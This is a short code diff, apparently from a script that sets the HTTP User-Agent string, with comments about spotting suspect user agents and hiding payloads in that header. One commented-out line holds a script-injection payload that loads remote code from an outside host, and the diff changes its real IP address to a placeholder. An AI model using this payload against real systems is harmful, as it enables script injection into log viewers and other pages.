@@ -8,7 +8,7 @@
 'https://www.youtube.com/watch?v=GjquFKa4afU&ab_channel=SANSDigitalForensicsandIncidentResponse
 'This one is suspect,might be hacker group: Dectected: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:79.0) Gecko/20100101 Firefox/79.0
 'We can also put payloads in the user Agent. This one phones home.
-'strUserAgent = "<script src=http://45.79.224.213></script>"
+'strUserAgent = "<script src=http://[IPAddress]></script>"
 strUserAgent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)"
 
 
